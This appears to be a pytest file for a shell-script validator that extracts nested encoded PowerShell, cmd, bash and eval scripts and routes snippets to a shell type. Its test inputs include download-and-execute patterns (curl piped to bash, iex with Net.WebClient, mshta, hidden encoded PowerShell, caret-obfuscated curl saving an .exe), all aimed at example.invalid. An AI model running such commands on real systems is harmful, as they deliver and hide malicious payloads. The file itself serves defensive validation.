"""Nested-script extraction, recursive validation and shell routing."""

import base64

import pytest
from conftest import J, require

from redteam.models import Shell
from redteam.validate import (
    Validator,
    effective_status,
    flatten_errors,
    recurse,
    router,
)

PS = J('power', 'shell')
PWSH = J('pw', 'sh')
NEW_ITEM = J('New-', 'Item')
CURL = J('cu', 'rl')
IEX = J('i', 'ex')


def enc(script: str) -> str:
    return base64.b64encode(script.encode('utf-16-le')).decode('ascii')


# --- extraction (pure) --------------------------------------------------


def shells_and_src(found):
    return [(i.shell, i.src, i.error) for i in found]


@pytest.mark.parametrize(
    ('src', 'outer', 'expected'),
    [
        (
            J(PS, ' -nop -w hidden -EncodedCommand ', enc('Get-Date')),
            Shell.CMD,
            [(Shell.POWERSHELL, 'Get-Date', None)],
        ),
        (
            J(PS, ' -enc ', enc('Get-Date')),
            Shell.POWERSHELL,
            [(Shell.POWERSHELL, 'Get-Date', None)],
        ),
        (
            J(PS, ' -e ', enc('1')),
            Shell.CMD,
            [(Shell.POWERSHELL, '1', None)],
        ),
        (
            J(PS, ' -ec not-base64!'),
            Shell.CMD,
            [(Shell.POWERSHELL, '', 'recurse.bad-base64')],
        ),
        (
            J(PS, ' -c "Get-Date; Get-Host"'),
            Shell.CMD,
            [(Shell.POWERSHELL, 'Get-Date; Get-Host', None)],
        ),
        (
            J(PS, ' -Command Get-Date'),
            Shell.BASH,
            [(Shell.POWERSHELL, 'Get-Date', None)],
        ),
        (
            J(PWSH, ' -NoProfile -File x.ps1'),
            Shell.BASH,
            [],
        ),
        (
            J('cmd /c "echo a & echo b"'),
            Shell.CMD,
            [(Shell.CMD, 'echo a & echo b', None)],
        ),
        (
            J('cmd.exe /q /c echo a'),
            Shell.POWERSHELL,
            [(Shell.CMD, 'echo a', None)],
        ),
        (
            J('cmd/c echo a'),
            Shell.CMD,
            [(Shell.CMD, 'echo a', None)],
        ),
        (
            "bash -c 'echo $(id)'",
            Shell.BASH,
            [(Shell.BASH, 'echo $(id)', None)],
        ),
        (
            'sh -lc "echo \\"q\\""',
            Shell.ZSH,
            [(Shell.SH, 'echo "q"', None)],
        ),
        (
            "zsh -c 'echo a' && echo b",
            Shell.BASH,
            [(Shell.ZSH, 'echo a', None)],
        ),
        (
            'eval "echo a; echo b"',
            Shell.BASH,
            [(Shell.BASH, 'echo a; echo b', None)],
        ),
        (
            f"{IEX} 'Get-Date'",
            Shell.POWERSHELL,
            [(Shell.POWERSHELL, 'Get-Date', None)],
        ),
        (
            J(CURL, ' https://example.invalid/x | bash'),
            Shell.BASH,
            [],
        ),
        ('echo bash -c is just text', Shell.CMD, []),
        ('ssh -c aes example.invalid', Shell.BASH, []),
    ],
)
def test_find_inner(src, outer, expected):
    assert shells_and_src(recurse.find_inner(src, outer)) == expected


def test_inner_repr_hides_source():
    inner = recurse.Inner(Shell.BASH, 'pastewardensentinel')
    assert 'pastewardensentinel' not in repr(inner)


def test_decode_encoded_command():
    assert recurse.decode_encoded_command(enc('aé')) == 'aé'
    assert recurse.decode_encoded_command('"' + enc('x') + '"') == 'x'
    assert recurse.decode_encoded_command('***') is None
    assert recurse.decode_encoded_command('YQ==') is None  # odd UTF-16


# --- recursive validation -----------------------------------------------


def nest(levels: int, core: str) -> str:
    """cmd /c -> powershell -enc -> ... wrapped ``levels`` times."""
    text = core
    for _ in range(levels):
        text = J(PS, ' -EncodedCommand ', enc(text))
    return text


def depth(verdict):
    return 1 + max((depth(i) for i in verdict.inner), default=0)


def test_mixed_cmd_powershell_base64(shared_validator):
    require(Shell.POWERSHELL)
    good = J('cmd /c ', nest(2, 'Get-Date'))
    verdict = shared_validator.validate(good, Shell.CMD)
    assert verdict.ok, verdict
    assert depth(verdict) == 4  # cmd -> cmd -> ps -> ps
    bad = J('cmd /c ', nest(2, 'if ('))
    verdict = shared_validator.validate(bad, Shell.CMD)
    assert verdict.status == 'ok'
    assert not verdict.ok
    assert effective_status(verdict) == 'invalid'
    assert any(e.id.startswith('pwsh.') for e in flatten_errors(verdict))


def test_max_depth_is_unchecked_not_ok(shared_validator):
    require(Shell.POWERSHELL)
    verdict = shared_validator.validate(nest(7, 'Get-Date'), Shell.POWERSHELL)
    assert not verdict.ok
    assert effective_status(verdict) == 'unchecked'
    assert depth(verdict) == recurse.RECURSE_MAX_DEPTH + 2
    ok = shared_validator.validate(nest(5, 'Get-Date'), Shell.POWERSHELL)
    assert ok.ok


def test_bash_c_inner_error(shared_validator):
    require(Shell.BASH)
    verdict = shared_validator.validate("bash -c 'if true; then'", Shell.BASH)
    assert verdict.status == 'ok'
    assert not verdict.ok
    assert verdict.inner[0].status == 'invalid'


def test_eval_inner_error(shared_validator):
    require(Shell.BASH)
    verdict = shared_validator.validate("eval 'echo \"a'", Shell.BASH)
    assert not verdict.ok


def test_cmd_inner_error_without_any_process():
    with Validator() as v:
        verdict = v.validate(J('cmd /c "echo a |"'), Shell.CMD)
    assert verdict.status == 'ok'
    assert verdict.inner[0].errors[0].id == 'cmd.dangling-operator'
    assert not verdict.ok


def test_too_many_inner_is_reported(shared_validator):
    src = ' & '.join(['cmd /c echo a'] * (recurse.RECURSE_MAX_INNER + 3))
    verdict = shared_validator.validate(src, Shell.CMD)
    assert verdict.inner[-1].errors[0].id == 'recurse.too-many'
    assert not verdict.ok


# --- router -------------------------------------------------------------


@pytest.mark.parametrize(
    ('src', 'shell'),
    [
        ('#!/bin/zsh\necho a', Shell.ZSH),
        ('#!/usr/bin/env bash\necho a', Shell.BASH),
        ('#!/bin/sh\necho a', Shell.SH),
        ('@echo off\nset x=1\necho %x%', Shell.CMD),
        (J('cmd /c start "" ', PS, ' -w h -c x'), Shell.CMD),
        (J('c^u^r^l -o %TEMP%\\a.exe https://example.invalid'), Shell.CMD),
        ('for %%i in (a b) do echo %%i', Shell.CMD),
        (J(J('ms', 'hta'), ' https://example.invalid/x.hta'), Shell.CMD),
        (
            J(
                '$u = "https://example.invalid"; ',
                J('Invoke-', 'WebRequest'),
                ' $u | Out-Null',
            ),
            Shell.POWERSHELL,
        ),
        (J('[System.Text.Encoding]::UTF8.GetString($b)'), Shell.POWERSHELL),
        (J(IEX, ' (New-Object Net.WebClient)'), Shell.POWERSHELL),
        ('Get-ChildItem $env:TEMP | % { $_.Name }', Shell.POWERSHELL),
        (J(CURL, ' -fsSL https://example.invalid/i.sh | bash'), Shell.BASH),
        ('if [[ -n "$x" ]]; then echo "${x}"; fi', Shell.BASH),
        ('echo aGk= | base64 -d | sh', Shell.BASH),
        ('ls *(.N)', Shell.ZSH),
        ('tell application "Finder"\nget name\nend tell', Shell.APPLESCRIPT),
        (J('do shell ', 'script "echo"'), Shell.APPLESCRIPT),
        ('echo hello', Shell.BASH),
    ],
)
def test_route(src, shell):
    assert router.route(src) is shell
